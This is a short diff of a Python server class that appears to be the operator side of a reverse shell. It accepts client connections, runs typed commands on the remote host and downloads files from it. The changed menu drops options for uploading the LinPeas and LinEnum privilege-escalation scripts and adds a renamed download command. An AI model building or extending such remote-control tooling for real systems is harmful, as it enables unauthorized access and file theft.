@@ -23,9 +23,9 @@ class ServerN1F:
         print(f"[+] Client connected  {str(addr)}")
 
 #   ##################################   MENU
-        print("[+] 0 : basic info")
-        print("[+] 1 : upload LinPeas")
-        print("[+] 2 : upload LinEnum")
+        print("[+] qq : exit")
+        print("[+] ddw : download file")
+        print("[+] soon... : basic info")
         print("\n")
 #   ##################################
 
@@ -68,7 +68,7 @@ class ServerN1F:
             command = input("$ ")
             command = command.split(" ")
             result = self.execute_command(command)
-            if command[0] == "download":
+            if command[0] == "ddw":
                 result = self.write_file(command[1], result)
             print(result)
 
